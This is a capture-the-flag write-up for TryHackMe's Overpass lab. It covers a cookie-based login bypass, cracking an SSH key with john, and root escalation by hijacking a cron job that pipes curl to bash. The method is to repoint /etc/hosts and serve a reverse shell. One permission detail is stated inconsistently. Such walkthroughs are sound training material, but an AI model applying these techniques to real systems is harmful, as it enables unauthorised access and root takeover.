---
title: "Overpass Writeup"
tags: writeup tryhackme
---

# [tryhackme/overpass](https://tryhackme.com/room/overpass)

## user.txt

After messing around and scanning the webservice the admin logon page is found at `/admin/`. 
This contains a logon box which doesn't seem vulnerable to the usual SQL injection attacks.
Checking the scripts on the page `login.js` contains the code that sends the username and password to
the server.

```js
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

You can notice here that on a successful login it sets the SessionToken cookie and refreshes the page.
Upon having no other success you might also come just try setting this cookie to a random value and
refreshing the page, and hey-ho that's the solution. Evidently the server doesn't actually check the
`SessionToken` cookie just that it is set. As such anybody can bypass authentication by setting it to
whatever they want.


Upon viewing the admin page you are given a password protected ssh rsa key. I will explain how to crack
this with john.
1. After pasting the key into a file named `id_rsa_james` you need to run ssh2john on the file, on my
kali system this was the command I ran
```shell
$ /usr/share/john/ssh2john.py ./id_rsa_james > ./id_rsa_james.john
```
2. After converting to a crackable format we can use john on `id_rsa_james.john`, it was hinted earlier
on the website that overpass was created as people were using password from rockyou: a pretty big hint
to use the rockyou wordlist.
```shell
$ john ./id_rsa_james.john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
```


After cracking the password for the rsa key you can remove the password using `ssh-keygen` (optional)
```shell
$ # Enter the old password
$ # Then enter nothing for the new password
$ ssh-keygen -p -f ./id_rsa_james
```


With our rsa key we can now ssh in and get the user flag

## root.txt

Snooping around james' home directory you can find a `.overpass` file which can be decrypted using
the tool downloaded from the website. This gives you james' password for the system but doesn't seem
to help much.

James has no sudo access on the machine.

There is a clue in todo.txt, it mentions a automated build script being ran: hence crontab is the first
place to check. And as predicted `/etc/crontab` contains an automated script being run.
```shell
# /etc/crontab: system-wide crontab                                                                                                                                                                                                          
# Unlike any other crontab you don't have to run the `crontab'                                                                                                                                                                               
# command to install the new version when you edit this file                                                                                                                                                                                 
# and files in /etc/cron.d. These files also have username fields,                                                                                                                                                                           
# that none of the other crontabs do.                                                                                                                                                                                                        
                                                                                                                                                                                                                                             
SHELL=/bin/sh                                                                                                                                                                                                                                
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin                                                                                                                                                                            
                                                                                                                                                                                                                                             
# m h dom mon dow user  command                                                                                                                                                                                                              
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly                                                                                                                                                                          
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )                                                                                                                                          
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )                                                                                                                                         
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )                                                                                                                                        
# Update builds from latest code                                                                                                                                                                                                             
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Every minute cron downloads a script from `http://overpass.thm/downloads/src/buildscript.sh` and runs it
as root, seems sus. Obviously overpass.thm is not a valid domain name so it is probably set in `/etc/hosts`
where it redirects to 127.0.0.1.

For some reason though `/etc/hosts` is 555 permissions (u+rw g+rw o+rw) so we are able to overwrite
`/etc/hosts` and point `overpass.thm` to the IP of our machine connected to the VPN. Then it is just the
matter of writing a reverse shell to a script called `./downloads/src/buildscript.sh` on a http server on
your machine and next time cron updates you have a reverse shell with root access. ez.

